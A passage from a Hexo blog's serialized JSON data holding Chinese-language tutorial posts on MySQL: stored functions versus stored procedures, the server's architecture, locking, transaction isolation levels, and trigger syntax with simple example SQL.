title=\"存储函数与存储过程的区别\"></a>存储函数与存储过程的区别</h4></li>\n<li><p>存储函数有且只有一个返回值，而存储过程不能有返回值；</p>\n</li>\n<li>函数只能有输入参数，而且不能带in, 而存储过程可以有多个in,out,inout参数；</li>\n<li>存储过程中的语句功能更强大，存储过程可以实现很复杂的业务逻辑，而函数有很多限制，如不能在函数中使用insert,update,delete,create等语句；存储函数只完成查询的工作，可接受输入参数并返回一个结果，也就是函数实现的功能针对性比较强；</li>\n<li>存储过程可以调用存储函数。但函数不能调用存储过程；</li>\n<li>存储过程一般是作为一个独立的部分来执行(call调用)。而函数可以作为查询语句的一个部分来调用。</li>\n</ul>\n"},{"title":"MySql系统架构简介","date":"2017-09-13T01:52:37.000Z","_content":"\n#### MySql系统架构图\n![MySql](MySql系统架构简介/1.png)\n\n**MySql系统简介：**\nMySql系统的架构如上图所示，现在就图中的每个模块进行简单说明。\n\n- 客户端：\n指的是MySql驱动或者命令行客户端，任何MySql用户都可以通过这种方式连接到MySql数据库。\n- 连接管理与安全验证\n\t1. 每个使用MySql数据库的用户都必须通过客户端工具连接到数据库之后才能使用数据库。而数据库并不能随便让任何人都能连接的上，所以，只有具备权限的用户才能正常连接到数据库。\n\t2. 每次连接到数据库的时候都需要创建一个连接，使用完成之后有得销毁该连接释放系统资源，从而完成一次数据库的访问。对于复杂的业务而言，可能需要频繁的连接数据库，因此会存在频繁的创建连接和销毁连接操作，而这些操作同样会造成系统资源的大量消耗，因此需要对连接进行管理。\n\t\n\t连接管理与安全验证这个模块的作用就是为了解决上述两个问题的。\n\n\t1. 当用户尝试连接到数据库的时候需要通过用户名、密码、主机IP、数据库名称等信息进行进行验证，只有通过验证的用户才能连接到数据库。\n\t2. 为了避免多次频繁创建、销毁连接带来的系统资源浪费，通常会采用连接池的方式来缓存连接对象。常用到的连接池有C3P0连接池和、Druid连接池。\n\n- 解析器\n解析器的作用是对SQL语句进行解析生成[解析树][1]，以便于后续优化器进行优化。当用户连接到数据库之后，解析器会拿到用户需要执行的SQL语句，然后到缓存器中去查询是否存在该SQL语句，如果存在，直接返回该条SQL上次的执行结果。反之，会检查该SQL语句中是否存在语法错误，根据检查结果决定是否生成解析树。\n- 优化器\n优化器主要是对查询进行优化。优化器拿到解析器生成的解析树之后会对解析后的SQL语句进行分析，根据表的索引，数据的读取方式，确定出多种查询方法。然后通过存储引擎获取这些查询方法相关的大致数据和统计信息，从而计算每种查询方法的开销信息，然后从多种查询方式中确定出开销最小的一种查询方法。\n\n- 执行器\n执行器根据优化后的SQL语句生成执行计划，执行查询语句，返回查询结果。\n- 缓存器\n对执行查询语句及查询结果进行缓存。\n- 存储引擎\n以上几个模块构成了MySql数据库的服务层，存储引擎数据数据库的存储层，是数据库的核心模块。该模块中包括了对数据库表的锁管理、事务管理等。常见的MySQL存储引擎有：InnoDB、MEMORY、MyISAM（my-z[ei]m）。\n- 锁管理\n锁机制就是数据库为了保证数据的一致性而使各种共享资源在被并发访问变得有序所设计的一种规则。对于一个查询语句为了不让查询的数据被其它语句所更改就需要给数据加锁。\nMySql中关于锁存在以下几个概念：\n\n\t- 排他锁（互斥锁）和共享锁\n\t**共享锁**又称为读锁，是指多个事务对于同一数据可以共享一把锁，都能访问到数据，但是只能读不能修改。\n\t**排他锁**又称为写锁，排他锁就是能与其他锁并存，如一个事务获取了一个数据行的排他锁，其他事务就不能再获取该行的其他锁，包括共享锁和排他锁。Mysql InnoDB引擎默认的修改数据语句，update,delete,insert都会自动给涉及到的数据加上排他锁，select语句默认不会加任何锁类型。\n\n\t- 锁粒度：是指锁控制的精细程度。可以分为行级锁和表级锁。\n\t- 行级锁和表级锁\n\t**表级锁**：表级别的锁定是MySQL各存储引擎中最大颗粒度的锁定机制。该锁定机制最大的特点是实现逻辑非常简单，带来的系统负面影响最小。所以获取锁和释放锁的速度很快。由于表级锁一次会将整个表锁定，所以可以很好的避免困扰我们的死锁问题，并发量低。\n\t**行级锁**：行级锁定最大的特点就是锁定对象的颗粒度很小，也是目前各大数据库管理软件所实现的锁定颗粒度最小的。由于锁定颗粒度很小，所以发生锁定资源争用的概率也最小，能够给予应用程序尽可能大的并发处理能力而提高一些需要高并发应用系统的整体性能。\n\t虽然能够在并发处理能力上面有较大的优势，但是行级锁定也因此带来了不少弊端。由于锁定资源的颗粒度很小，所以每次获取锁和释放锁需要做的事情也更多，带来的消耗自然也就更大了。此外，行级锁定也最容易发生死锁。\n\t- 锁策略\n\t\n\t- 死锁： 是指两个或两个以上的进程在执行过程中，因争夺资源而造成的一种互相等待的现象，若无外力作用，它们都将无法推进下去。\n此时称系统处于死锁状态或系统产生了死锁，这些永远在互相等待的进程称为死锁进程。表级锁不会产生死锁。\n\n\t在Innodb的事务管理和锁定机制中，有专门检测死锁的机制，会在系统中产生死锁之后的很短时间内就检测到该死锁的存在。当Innodb检测到系统中产生了死锁之后，Innodb会通过相应的判断来选这产生死锁的两个事务中较小的事务来回滚\n\n- 事务管理\n\n\t- 事务的特性\n\t\t1. 原子性：事务是不可分割的最小工作单元，整个事务要么全部提交要么全部回滚失败。\n\t\t2. 一致性：数据库总是从一个一致性状态转换到另一个一致性的状态。\n\t\t3. 隔离性： 一个事务所做的更改在最终提交之前其它事务是不可见的。\n\t\t4. 持久性：事务一旦提交所做的修改就会永久保存在数据库中，即使系统崩溃，数据也不会丢失。\n\t- 事务的隔离级别\n\t\t1. 未提交读（READ UNCOMMITTED）：未提交读隔离级别也叫读脏，就是事务可以读取其它事务未提交的数据。\n\t\t2. 提交读（READ COMMITTED）：其它数据库系统比如SQL Server默认的隔离级别就是提交读，已提交读隔离级别就是在事务\n\t\t3. 可重复读（REPEATABLE READ）：保证同一个事务中的多次相同的查询的结果是一致的，比如一个事务一开始查询了一条记录然后过了几秒钟又执行了相同的查询，保证两次查询的结果是相同的，可重复读也是mysql的默认隔离级别。\n\t\t4. 可串行化（SERIALIZABLE）:可串行化就是保证读取的范围内没有新的数据插入，比如事务第一次查询得到某个范围的数据，第二次查询也同样得到了相同范围的数据，中间没有新的数据插入到该范围中。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[1]: https://segmentfault.com/a/1190000008120254\n\n\n\n\t","source":"_posts/MySql系统架构简介.md","raw":"---\ntitle: MySql系统架构简介\ndate: 2017-09-13 09:52:37\ntags: MySql\n---\n\n#### MySql系统架构图\n![MySql](MySql系统架构简介/1.png)\n\n**MySql系统简介：**\nMySql系统的架构如上图所示，现在就图中的每个模块进行简单说明。\n\n- 客户端：\n指的是MySql驱动或者命令行客户端，任何MySql用户都可以通过这种方式连接到MySql数据库。\n- 连接管理与安全验证\n\t1. 每个使用MySql数据库的用户都必须通过客户端工具连接到数据库之后才能使用数据库。而数据库并不能随便让任何人都能连接的上，所以，只有具备权限的用户才能正常连接到数据库。\n\t2. 每次连接到数据库的时候都需要创建一个连接，使用完成之后有得销毁该连接释放系统资源，从而完成一次数据库的访问。对于复杂的业务而言，可能需要频繁的连接数据库，因此会存在频繁的创建连接和销毁连接操作，而这些操作同样会造成系统资源的大量消耗，因此需要对连接进行管理。\n\t\n\t连接管理与安全验证这个模块的作用就是为了解决上述两个问题的。\n\n\t1. 当用户尝试连接到数据库的时候需要通过用户名、密码、主机IP、数据库名称等信息进行进行验证，只有通过验证的用户才能连接到数据库。\n\t2. 为了避免多次频繁创建、销毁连接带来的系统资源浪费，通常会采用连接池的方式来缓存连接对象。常用到的连接池有C3P0连接池和、Druid连接池。\n\n- 解析器\n解析器的作用是对SQL语句进行解析生成[解析树][1]，以便于后续优化器进行优化。当用户连接到数据库之后，解析器会拿到用户需要执行的SQL语句，然后到缓存器中去查询是否存在该SQL语句，如果存在，直接返回该条SQL上次的执行结果。反之，会检查该SQL语句中是否存在语法错误，根据检查结果决定是否生成解析树。\n- 优化器\n优化器主要是对查询进行优化。优化器拿到解析器生成的解析树之后会对解析后的SQL语句进行分析，根据表的索引，数据的读取方式，确定出多种查询方法。然后通过存储引擎获取这些查询方法相关的大致数据和统计信息，从而计算每种查询方法的开销信息，然后从多种查询方式中确定出开销最小的一种查询方法。\n\n- 执行器\n执行器根据优化后的SQL语句生成执行计划，执行查询语句，返回查询结果。\n- 缓存器\n对执行查询语句及查询结果进行缓存。\n- 存储引擎\n以上几个模块构成了MySql数据库的服务层，存储引擎数据数据库的存储层，是数据库的核心模块。该模块中包括了对数据库表的锁管理、事务管理等。常见的MySQL存储引擎有：InnoDB、MEMORY、MyISAM（my-z[ei]m）。\n- 锁管理\n锁机制就是数据库为了保证数据的一致性而使各种共享资源在被并发访问变得有序所设计的一种规则。对于一个查询语句为了不让查询的数据被其它语句所更改就需要给数据加锁。\nMySql中关于锁存在以下几个概念：\n\n\t- 排他锁（互斥锁）和共享锁\n\t**共享锁**又称为读锁，是指多个事务对于同一数据可以共享一把锁，都能访问到数据，但是只能读不能修改。\n\t**排他锁**又称为写锁，排他锁就是能与其他锁并存，如一个事务获取了一个数据行的排他锁，其他事务就不能再获取该行的其他锁，包括共享锁和排他锁。Mysql InnoDB引擎默认的修改数据语句，update,delete,insert都会自动给涉及到的数据加上排他锁，select语句默认不会加任何锁类型。\n\n\t- 锁粒度：是指锁控制的精细程度。可以分为行级锁和表级锁。\n\t- 行级锁和表级锁\n\t**表级锁**：表级别的锁定是MySQL各存储引擎中最大颗粒度的锁定机制。该锁定机制最大的特点是实现逻辑非常简单，带来的系统负面影响最小。所以获取锁和释放锁的速度很快。由于表级锁一次会将整个表锁定，所以可以很好的避免困扰我们的死锁问题，并发量低。\n\t**行级锁**：行级锁定最大的特点就是锁定对象的颗粒度很小，也是目前各大数据库管理软件所实现的锁定颗粒度最小的。由于锁定颗粒度很小，所以发生锁定资源争用的概率也最小，能够给予应用程序尽可能大的并发处理能力而提高一些需要高并发应用系统的整体性能。\n\t虽然能够在并发处理能力上面有较大的优势，但是行级锁定也因此带来了不少弊端。由于锁定资源的颗粒度很小，所以每次获取锁和释放锁需要做的事情也更多，带来的消耗自然也就更大了。此外，行级锁定也最容易发生死锁。\n\t- 锁策略\n\t\n\t- 死锁： 是指两个或两个以上的进程在执行过程中，因争夺资源而造成的一种互相等待的现象，若无外力作用，它们都将无法推进下去。\n此时称系统处于死锁状态或系统产生了死锁，这些永远在互相等待的进程称为死锁进程。表级锁不会产生死锁。\n\n\t在Innodb的事务管理和锁定机制中，有专门检测死锁的机制，会在系统中产生死锁之后的很短时间内就检测到该死锁的存在。当Innodb检测到系统中产生了死锁之后，Innodb会通过相应的判断来选这产生死锁的两个事务中较小的事务来回滚\n\n- 事务管理\n\n\t- 事务的特性\n\t\t1. 原子性：事务是不可分割的最小工作单元，整个事务要么全部提交要么全部回滚失败。\n\t\t2. 一致性：数据库总是从一个一致性状态转换到另一个一致性的状态。\n\t\t3. 隔离性： 一个事务所做的更改在最终提交之前其它事务是不可见的。\n\t\t4. 持久性：事务一旦提交所做的修改就会永久保存在数据库中，即使系统崩溃，数据也不会丢失。\n\t- 事务的隔离级别\n\t\t1. 未提交读（READ UNCOMMITTED）：未提交读隔离级别也叫读脏，就是事务可以读取其它事务未提交的数据。\n\t\t2. 提交读（READ COMMITTED）：其它数据库系统比如SQL Server默认的隔离级别就是提交读，已提交读隔离级别就是在事务\n\t\t3. 可重复读（REPEATABLE READ）：保证同一个事务中的多次相同的查询的结果是一致的，比如一个事务一开始查询了一条记录然后过了几秒钟又执行了相同的查询，保证两次查询的结果是相同的，可重复读也是mysql的默认隔离级别。\n\t\t4. 可串行化（SERIALIZABLE）:可串行化就是保证读取的范围内没有新的数据插入，比如事务第一次查询得到某个范围的数据，第二次查询也同样得到了相同范围的数据，中间没有新的数据插入到该范围中。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[1]: https://segmentfault.com/a/1190000008120254\n\n\n\n\t","slug":"MySql系统架构简介","published":1,"updated":"2018-02-08T06:51:44.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tw8001cmfahqlzyoz7f","content":"<h4 id=\"MySql系统架构图\"><a href=\"#MySql系统架构图\" class=\"headerlink\" title=\"MySql系统架构图\"></a>MySql系统架构图</h4><p><img src=\"MySql系统架构简介/1.png\" alt=\"MySql\"></p>\n<p><strong>MySql系统简介：</strong><br>MySql系统的架构如上图所示，现在就图中的每个模块进行简单说明。</p>\n<ul>\n<li>客户端：<br>指的是MySql驱动或者命令行客户端，任何MySql用户都可以通过这种方式连接到MySql数据库。</li>\n<li><p>连接管理与安全验证</p>\n<ol>\n<li>每个使用MySql数据库的用户都必须通过客户端工具连接到数据库之后才能使用数据库。而数据库并不能随便让任何人都能连接的上，所以，只有具备权限的用户才能正常连接到数据库。</li>\n<li><p>每次连接到数据库的时候都需要创建一个连接，使用完成之后有得销毁该连接释放系统资源，从而完成一次数据库的访问。对于复杂的业务而言，可能需要频繁的连接数据库，因此会存在频繁的创建连接和销毁连接操作，而这些操作同样会造成系统资源的大量消耗，因此需要对连接进行管理。</p>\n<p>连接管理与安全验证这个模块的作用就是为了解决上述两个问题的。</p>\n</li>\n<li><p>当用户尝试连接到数据库的时候需要通过用户名、密码、主机IP、数据库名称等信息进行进行验证，只有通过验证的用户才能连接到数据库。</p>\n</li>\n<li>为了避免多次频繁创建、销毁连接带来的系统资源浪费，通常会采用连接池的方式来缓存连接对象。常用到的连接池有C3P0连接池和、Druid连接池。</li>\n</ol>\n</li>\n<li><p>解析器<br>解析器的作用是对SQL语句进行解析生成<a href=\"https://segmentfault.com/a/1190000008120254\" target=\"_blank\" rel=\"noopener\">解析树</a>，以便于后续优化器进行优化。当用户连接到数据库之后，解析器会拿到用户需要执行的SQL语句，然后到缓存器中去查询是否存在该SQL语句，如果存在，直接返回该条SQL上次的执行结果。反之，会检查该SQL语句中是否存在语法错误，根据检查结果决定是否生成解析树。</p>\n</li>\n<li><p>优化器<br>优化器主要是对查询进行优化。优化器拿到解析器生成的解析树之后会对解析后的SQL语句进行分析，根据表的索引，数据的读取方式，确定出多种查询方法。然后通过存储引擎获取这些查询方法相关的大致数据和统计信息，从而计算每种查询方法的开销信息，然后从多种查询方式中确定出开销最小的一种查询方法。</p>\n</li>\n<li><p>执行器<br>执行器根据优化后的SQL语句生成执行计划，执行查询语句，返回查询结果。</p>\n</li>\n<li>缓存器<br>对执行查询语句及查询结果进行缓存。</li>\n<li>存储引擎<br>以上几个模块构成了MySql数据库的服务层，存储引擎数据数据库的存储层，是数据库的核心模块。该模块中包括了对数据库表的锁管理、事务管理等。常见的MySQL存储引擎有：InnoDB、MEMORY、MyISAM（my-z[ei]m）。</li>\n<li><p>锁管理<br>锁机制就是数据库为了保证数据的一致性而使各种共享资源在被并发访问变得有序所设计的一种规则。对于一个查询语句为了不让查询的数据被其它语句所更改就需要给数据加锁。<br>MySql中关于锁存在以下几个概念：</p>\n<ul>\n<li><p>排他锁（互斥锁）和共享锁<br><strong>共享锁</strong>又称为读锁，是指多个事务对于同一数据可以共享一把锁，都能访问到数据，但是只能读不能修改。<br><strong>排他锁</strong>又称为写锁，排他锁就是能与其他锁并存，如一个事务获取了一个数据行的排他锁，其他事务就不能再获取该行的其他锁，包括共享锁和排他锁。Mysql InnoDB引擎默认的修改数据语句，update,delete,insert都会自动给涉及到的数据加上排他锁，select语句默认不会加任何锁类型。</p>\n</li>\n<li><p>锁粒度：是指锁控制的精细程度。可以分为行级锁和表级锁。</p>\n</li>\n<li>行级锁和表级锁<br><strong>表级锁</strong>：表级别的锁定是MySQL各存储引擎中最大颗粒度的锁定机制。该锁定机制最大的特点是实现逻辑非常简单，带来的系统负面影响最小。所以获取锁和释放锁的速度很快。由于表级锁一次会将整个表锁定，所以可以很好的避免困扰我们的死锁问题，并发量低。<br><strong>行级锁</strong>：行级锁定最大的特点就是锁定对象的颗粒度很小，也是目前各大数据库管理软件所实现的锁定颗粒度最小的。由于锁定颗粒度很小，所以发生锁定资源争用的概率也最小，能够给予应用程序尽可能大的并发处理能力而提高一些需要高并发应用系统的整体性能。<br>虽然能够在并发处理能力上面有较大的优势，但是行级锁定也因此带来了不少弊端。由于锁定资源的颗粒度很小，所以每次获取锁和释放锁需要做的事情也更多，带来的消耗自然也就更大了。此外，行级锁定也最容易发生死锁。</li>\n<li><p>锁策略</p>\n</li>\n<li><p>死锁： 是指两个或两个以上的进程在执行过程中，因争夺资源而造成的一种互相等待的现象，若无外力作用，它们都将无法推进下去。<br>此时称系统处于死锁状态或系统产生了死锁，这些永远在互相等待的进程称为死锁进程。表级锁不会产生死锁。</p>\n<p>在Innodb的事务管理和锁定机制中，有专门检测死锁的机制，会在系统中产生死锁之后的很短时间内就检测到该死锁的存在。当Innodb检测到系统中产生了死锁之后，Innodb会通过相应的判断来选这产生死锁的两个事务中较小的事务来回滚</p>\n</li>\n</ul>\n</li>\n<li><p>事务管理</p>\n<ul>\n<li>事务的特性<ol>\n<li>原子性：事务是不可分割的最小工作单元，整个事务要么全部提交要么全部回滚失败。</li>\n<li>一致性：数据库总是从一个一致性状态转换到另一个一致性的状态。</li>\n<li>隔离性： 一个事务所做的更改在最终提交之前其它事务是不可见的。</li>\n<li>持久性：事务一旦提交所做的修改就会永久保存在数据库中，即使系统崩溃，数据也不会丢失。</li>\n</ol>\n</li>\n<li>事务的隔离级别<ol>\n<li>未提交读（READ UNCOMMITTED）：未提交读隔离级别也叫读脏，就是事务可以读取其它事务未提交的数据。</li>\n<li>提交读（READ COMMITTED）：其它数据库系统比如SQL Server默认的隔离级别就是提交读，已提交读隔离级别就是在事务</li>\n<li>可重复读（REPEATABLE READ）：保证同一个事务中的多次相同的查询的结果是一致的，比如一个事务一开始查询了一条记录然后过了几秒钟又执行了相同的查询，保证两次查询的结果是相同的，可重复读也是mysql的默认隔离级别。</li>\n<li>可串行化（SERIALIZABLE）:可串行化就是保证读取的范围内没有新的数据插入，比如事务第一次查询得到某个范围的数据，第二次查询也同样得到了相同范围的数据，中间没有新的数据插入到该范围中。</li>\n</ol>\n</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"MySql系统架构图\"><a href=\"#MySql系统架构图\" class=\"headerlink\" title=\"MySql系统架构图\"></a>MySql系统架构图</h4><p><img src=\"MySql系统架构简介/1.png\" alt=\"MySql\"></p>\n<p><strong>MySql系统简介：</strong><br>MySql系统的架构如上图所示，现在就图中的每个模块进行简单说明。</p>\n<ul>\n<li>客户端：<br>指的是MySql驱动或者命令行客户端，任何MySql用户都可以通过这种方式连接到MySql数据库。</li>\n<li><p>连接管理与安全验证</p>\n<ol>\n<li>每个使用MySql数据库的用户都必须通过客户端工具连接到数据库之后才能使用数据库。而数据库并不能随便让任何人都能连接的上，所以，只有具备权限的用户才能正常连接到数据库。</li>\n<li><p>每次连接到数据库的时候都需要创建一个连接，使用完成之后有得销毁该连接释放系统资源，从而完成一次数据库的访问。对于复杂的业务而言，可能需要频繁的连接数据库，因此会存在频繁的创建连接和销毁连接操作，而这些操作同样会造成系统资源的大量消耗，因此需要对连接进行管理。</p>\n<p>连接管理与安全验证这个模块的作用就是为了解决上述两个问题的。</p>\n</li>\n<li><p>当用户尝试连接到数据库的时候需要通过用户名、密码、主机IP、数据库名称等信息进行进行验证，只有通过验证的用户才能连接到数据库。</p>\n</li>\n<li>为了避免多次频繁创建、销毁连接带来的系统资源浪费，通常会采用连接池的方式来缓存连接对象。常用到的连接池有C3P0连接池和、Druid连接池。</li>\n</ol>\n</li>\n<li><p>解析器<br>解析器的作用是对SQL语句进行解析生成<a href=\"https://segmentfault.com/a/1190000008120254\" target=\"_blank\" rel=\"noopener\">解析树</a>，以便于后续优化器进行优化。当用户连接到数据库之后，解析器会拿到用户需要执行的SQL语句，然后到缓存器中去查询是否存在该SQL语句，如果存在，直接返回该条SQL上次的执行结果。反之，会检查该SQL语句中是否存在语法错误，根据检查结果决定是否生成解析树。</p>\n</li>\n<li><p>优化器<br>优化器主要是对查询进行优化。优化器拿到解析器生成的解析树之后会对解析后的SQL语句进行分析，根据表的索引，数据的读取方式，确定出多种查询方法。然后通过存储引擎获取这些查询方法相关的大致数据和统计信息，从而计算每种查询方法的开销信息，然后从多种查询方式中确定出开销最小的一种查询方法。</p>\n</li>\n<li><p>执行器<br>执行器根据优化后的SQL语句生成执行计划，执行查询语句，返回查询结果。</p>\n</li>\n<li>缓存器<br>对执行查询语句及查询结果进行缓存。</li>\n<li>存储引擎<br>以上几个模块构成了MySql数据库的服务层，存储引擎数据数据库的存储层，是数据库的核心模块。该模块中包括了对数据库表的锁管理、事务管理等。常见的MySQL存储引擎有：InnoDB、MEMORY、MyISAM（my-z[ei]m）。</li>\n<li><p>锁管理<br>锁机制就是数据库为了保证数据的一致性而使各种共享资源在被并发访问变得有序所设计的一种规则。对于一个查询语句为了不让查询的数据被其它语句所更改就需要给数据加锁。<br>MySql中关于锁存在以下几个概念：</p>\n<ul>\n<li><p>排他锁（互斥锁）和共享锁<br><strong>共享锁</strong>又称为读锁，是指多个事务对于同一数据可以共享一把锁，都能访问到数据，但是只能读不能修改。<br><strong>排他锁</strong>又称为写锁，排他锁就是能与其他锁并存，如一个事务获取了一个数据行的排他锁，其他事务就不能再获取该行的其他锁，包括共享锁和排他锁。Mysql InnoDB引擎默认的修改数据语句，update,delete,insert都会自动给涉及到的数据加上排他锁，select语句默认不会加任何锁类型。</p>\n</li>\n<li><p>锁粒度：是指锁控制的精细程度。可以分为行级锁和表级锁。</p>\n</li>\n<li>行级锁和表级锁<br><strong>表级锁</strong>：表级别的锁定是MySQL各存储引擎中最大颗粒度的锁定机制。该锁定机制最大的特点是实现逻辑非常简单，带来的系统负面影响最小。所以获取锁和释放锁的速度很快。由于表级锁一次会将整个表锁定，所以可以很好的避免困扰我们的死锁问题，并发量低。<br><strong>行级锁</strong>：行级锁定最大的特点就是锁定对象的颗粒度很小，也是目前各大数据库管理软件所实现的锁定颗粒度最小的。由于锁定颗粒度很小，所以发生锁定资源争用的概率也最小，能够给予应用程序尽可能大的并发处理能力而提高一些需要高并发应用系统的整体性能。<br>虽然能够在并发处理能力上面有较大的优势，但是行级锁定也因此带来了不少弊端。由于锁定资源的颗粒度很小，所以每次获取锁和释放锁需要做的事情也更多，带来的消耗自然也就更大了。此外，行级锁定也最容易发生死锁。</li>\n<li><p>锁策略</p>\n</li>\n<li><p>死锁： 是指两个或两个以上的进程在执行过程中，因争夺资源而造成的一种互相等待的现象，若无外力作用，它们都将无法推进下去。<br>此时称系统处于死锁状态或系统产生了死锁，这些永远在互相等待的进程称为死锁进程。表级锁不会产生死锁。</p>\n<p>在Innodb的事务管理和锁定机制中，有专门检测死锁的机制，会在系统中产生死锁之后的很短时间内就检测到该死锁的存在。当Innodb检测到系统中产生了死锁之后，Innodb会通过相应的判断来选这产生死锁的两个事务中较小的事务来回滚</p>\n</li>\n</ul>\n</li>\n<li><p>事务管理</p>\n<ul>\n<li>事务的特性<ol>\n<li>原子性：事务是不可分割的最小工作单元，整个事务要么全部提交要么全部回滚失败。</li>\n<li>一致性：数据库总是从一个一致性状态转换到另一个一致性的状态。</li>\n<li>隔离性： 一个事务所做的更改在最终提交之前其它事务是不可见的。</li>\n<li>持久性：事务一旦提交所做的修改就会永久保存在数据库中，即使系统崩溃，数据也不会丢失。</li>\n</ol>\n</li>\n<li>事务的隔离级别<ol>\n<li>未提交读（READ UNCOMMITTED）：未提交读隔离级别也叫读脏，就是事务可以读取其它事务未提交的数据。</li>\n<li>提交读（READ COMMITTED）：其它数据库系统比如SQL Server默认的隔离级别就是提交读，已提交读隔离级别就是在事务</li>\n<li>可重复读（REPEATABLE READ）：保证同一个事务中的多次相同的查询的结果是一致的，比如一个事务一开始查询了一条记录然后过了几秒钟又执行了相同的查询，保证两次查询的结果是相同的，可重复读也是mysql的默认隔离级别。</li>\n<li>可串行化（SERIALIZABLE）:可串行化就是保证读取的范围内没有新的数据插入，比如事务第一次查询得到某个范围的数据，第二次查询也同样得到了相同范围的数据，中间没有新的数据插入到该范围中。</li>\n</ol>\n</li>\n</ul>\n</li>\n</ul>\n"},{"title":"MySql触发器","date":"2017-12-30T06:12:04.000Z","_content":"\n[TOC]\n#### 什么是触发器\n触发器，顾名思义是在触发了某个动作之后而执行的一串数据库脚本。主要是用在数据的增、删、改动作之上。触发器的执行是自动的，只要触发器中监听的动作发生了触发器就会自动执行。\n#### 触发器的定义\n\n\tDROP TRIGGER IF EXISTS triggerName; -- just for update trigger\n\tCREATE TRIGGER triggerName BEFORE UPDATE\n\t  ON tableName FOR EACH ROW\n\t  BEGIN \n\t  \t-- to do something\n\t  END;\n\n#### 触发器中的BEFORE 和 AFTER\nBEFORE：(INSERT、UPDATE)可以对NEW中的数据进行拦截**修改**，\nAFTER：不能对NEW进行修改。\n两者都不能修改OLD（**只读**）数据，但是可以获取到OLD中的数据。即，触发器不能修改原来表中的数据。\n\n\n\tDELIMITER $$\n\tDROP TRIGGER IF EXISTS updateTrigger;\n\tCREATE TRIGGER updateTrigger BEFORE UPDATE ON user FOR EACH ROW\n\t    BEGIN\n\t\tDECLARE oldName VARCHAR(20);\n\t\tDECLARE newName VARCHAR(20);\n\t\t-- 测试更新操作之前能否对拿到OLD和NEW的虚拟表对象\n\t\tSET newName = NEW.name;\n\t\tSET oldName = OLD.name;\n\t\tIF newName IS NOT NULL AND oldName IS NOT NULL THEN\n\t\t    SET NEW .name = \"error name\";\n\t\tEND IF;\n\t    END $$\n\n\tDELIMITER ;\n\n\t-- 验证\n\tUPDATE user SET name = \"zhangsan\" WHERE id = 4;\n\t-- 查看结果\n\tSELECT * FROM user WHERE id = 4;\n\n![](imgs/20180209-161422.png)\n\n**实例：**\n\n\t-- 对user表中插入前的数据进行拦截修改用户名为大写\n\tDELIMITER $$\n\tDROP TRIGGER IF EXISTS nameToUpperCase;\n\n\tCREATE TRIGGER nameToUpperCase BEFORE INSERT ON user FOR EACH ROW\n\t    BEGIN\n\t\tDECLARE upperName VARCHAR(20);\n\t\t/*\n\t\t对于insert 操作，只能修改插入的数据，而不能对数据库中原来的数据进行修改。\n\t\t即：只能操作NEW对象，不能操作OLD对象\n\t\t*/\n\t\tSET upperName = NEW.name;\n\t\tSELECT upper(upperName) INTO upperName;\n\t\tSET NEW.name = upperName;\n\t    END $$\n\n\tDELIMITER ;\n\n\t-- 向表中插入数据\n\tINSERT INTO user (name, age, gender, creator, create_time) VALUES (\"lowwer\", 22, \"boy\", 1, sysdate());\n\n\t-- 查询结果\n\tSELECT * FROM user WHERE age = 22;\n\n**总结：**\t\nAFTER：是在记录操纵之后触发，是先完成数据的增删改，再触发，触发的语句晚于监视的增删改操作，无法影响前面的增删改动作\nBEFORE：是在记录操纵之前触发，是先完成触发，再增删改，触发的语句先于监视的增删改，我们就有机会判断，修改即将发生的操作，如：我们在触发之前需要判断new值和old值的大小或关系，如果满足要求就触发，不通过就修改再触发；如：表之间定义的有外键，在删除主键时，必须要先删除外键表，这时就有先后之分，这里before相当于设置了断点，我们可以处理删除外键。\n\n\n#### 触发器中的NEW 和 OLD\n- INSERT语句, 只有NEW是合法的，因为是新添加数据；\n- DELETE语句，只有OLD才合法，因为没有新数据可以操作；\n- UPDATE语句，NEW、OLD可以同时使用。\n\n\t\tDELIMITER $$\n\t\tDROP TRIGGER IF EXISTS deleteTrigger;\n\t\tCREATE TRIGGER deleteTrigger AFTER DELETE ON user FOR EACH ROW\n\t\t    BEGIN\n\t\t\t/*\n\t\t\tDELETE 触发器在 DELETE 语句执行之前或之后执行。需要知道以下两点：\n\t\t\t1.在 DELETE 触发器代码内，你可以引用一个名为 OLD 的虚拟表，访问被删除的行；\n\t\t\t2.OLD 中的值全都是只读的，不能更新。下面的例子演示使用 OLD 保存将要被删除的行到一个存档表中：\n\t\t\t*/\n\t\t\tIF OLD.id = 2 THEN\n\t\t\t    -- 触发器不能在监控增删改的时候再更改同一张表\n\t\t\t    INSERT INTO course(name, teacher, type) VALUES (\"自然\", \"王小英\", 1);\n\t\t\tEND IF;\n\t\t    END $$\n\t\tDELIMITER ;\n\n\t\tDELETE FROM user WHERE id = 2;\n\t\t","source":"_posts/MySql触发器.md","raw":"---\ntitle: MySql触发器\ndate: 2017-12-30 14:12:04\ntags: MySql\n---\n\n[TOC]\n#### 什么是触发器\n触发器，顾名思义是在触发了某个动作之后而执行的一串数据库脚本。主要是用在数据的增、删、改动作之上。触发器的执行是自动的，只要触发器中监听的动作发生了触发器就会自动执行。\n#### 触发器的定义\n\n\tDROP TRIGGER IF EXISTS triggerName; -- just for update trigger\n\tCREATE TRIGGER triggerName BEFORE UPDATE\n\t  ON tableName FOR EACH ROW\n\t  BEGIN \n\t  \t-- to do something\n\t  END;\n\n#### 触发器中的BEFORE 和 AFTER\nBEFORE：(INSERT、UPDATE)可以对NEW中的数据进行拦截**修改**，\nAFTER：不能对NEW进行修改。\n两者都不能修改OLD（**只读**）数据，但是可以获取到OLD中的数据。即，触发器不能修改原来表中的数据。\n\n\n\tDELIMITER $$\n\tDROP TRIGGER IF EXISTS updateTrigger;\n\tCREATE TRIGGER updateTrigger BEFORE UPDATE ON user FOR EACH ROW\n\t    BEGIN\n\t\tDECLARE oldName VARCHAR(20);\n\t\tDECLARE newName VARCHAR(20);\n\t\t-- 测试更新操作之前能否对拿到OLD和NEW的虚拟表对象\n\t\tSET newName = NEW.name;\n\t\tSET oldName = OLD.name;\n\t\tIF newName IS NOT NULL AND oldName IS NOT NULL THEN\n\t\t    SET NEW .name = \"error name\";\n\t\tEND IF;\n\t    END $$\n\n\tDELIMITER ;\n\n\t-- 验证\n\tUPDATE user SET name = \"zhangsan\" WHERE id = 4;\n\t-- 查看结果\n\tSELECT * FROM user WHERE id = 4;\n\n![](imgs/20180209-161422.png)\n\n**实例：**\n\n\t-- 